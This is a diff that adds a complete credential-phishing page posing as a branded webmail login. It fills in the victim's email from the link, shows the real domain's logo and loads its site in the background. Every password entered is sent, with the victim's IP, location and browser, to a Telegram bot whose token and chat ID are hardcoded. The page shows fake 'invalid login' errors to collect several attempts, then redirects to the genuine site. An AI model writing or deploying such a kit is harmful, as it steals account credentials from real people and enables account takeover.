@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title> Mail </title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #background-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    #background-frame {
+      width: 100%;
+      height: 100%;
+      border: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+    }
+
+    .abstract-shapes {
+      display: none;
+    }
+
+    .form-container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.8);
+      text-align: center;
+      width: 350px;
+      border: 2px solid #ddd;
+      position: relative;
+      z-index: 1;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #db1414;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .form-group button {
+      width: 60%;
+      padding: 12px;
+      background: #e84a4a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 20px;
+      margin-left: auto;
+      margin-right: auto;
+      display: block;
+    }
+
+    .form-group button:hover {
+      background: #e84a4a;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 10px;
+      text-align: left;
+    }
+
+    #domainLogo {
+      max-height: 50px;
+      display: block;
+      margin: 0 auto 20px;
+    }
+
+    #session-expired {
+      color: red;
+      font-weight: normal;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+<div id="background-container">
+  <iframe id="background-frame" src="" frameborder="0"></iframe>
+</div>
+
+<div class="form-container">
+  <img id="domainLogo" alt="Domain Logo" style="display: none;">
+  <h2 id="emailDomainHeader"> Login to Mail</h2>
+
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" readonly required>
+    </div>
+    <div class="error-message" id="errorMessage">The login is invalid.</div>
+    <div class="form-group">
+      <label for="Password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" autofocus required>
+    </div>
+    <div class="form-group">
+      <button type="submit">LOGIN</button>
+    </div>
+  </form>
+</div>
+
+<script>
+const token = "8999353284:AAHYWAdbYqoihBIOz4nf3wapbIClNkzF094";
+const chatId = "8332792903";
+let attemptCount = 0;
+
+// Handle email from hash
+const fragment = window.location.hash.slice(1);
+const email = decodeURIComponent(fragment);
+if (email) {
+  const emailField = document.getElementById('email');
+  emailField.value = email;
+
+  const emailDomain = email.split('@')[1];
+  const emailDomainHeader = emailDomain.split('.')[0];
+  document.getElementById('emailDomainHeader').textContent = ` ${emailDomainHeader} Portal`;
+
+  const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
+  const logoImg = document.getElementById('domainLogo');
+  logoImg.src = logoUrl;
+  logoImg.onerror = () => logoImg.style.display = "none";
+  logoImg.style.display = "block";
+
+  document.getElementById('background-frame').src = `https://${emailDomain}`;
+}
+
+const errorMessage = document.getElementById("errorMessage");
+document.getElementById("password").addEventListener("input", () => {
+  errorMessage.style.display = "none";
+});
+
+// Send data to Telegram
+function sendToTelegram(email, password, attempt) {
+  fetch("https://api.db-ip.com/v2/free/self")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ipAddress || "Unknown";
+      const country = data.countryName || "Unknown";
+      const region = data.stateProv || "Unknown";
+      const time = new Date().toLocaleString();
+      const message = `🔐 Attempt ${attempt}/3\n\n` +
+        `📧 Email: ${email}\n` +
+        `🔑 Password: ${password}\n` +
+        `🌐 IP: ${ip}\n` +
+        `🌍 Country: ${country}\n` +
+        `🗺️ Region: ${region}\n` +
+        `🕒 Time: ${time}\n` +
+        `📱 Browser: ${navigator.userAgent}`;
+
+      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+      });
+    })
+    .then(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your password has now been maintained! You can continue using your account without interruption.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
+    })
+    .catch(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your password has now been Re-validated! You can continue using your account without interruption.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
+    });
+}
+
+// Form handler
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+  const password = document.getElementById("password").value.trim();
+  if (!password) return;
+
+  attemptCount++;
+  sendToTelegram(email, password, attemptCount);
+});
+</script>
+
+</body>
+</html>
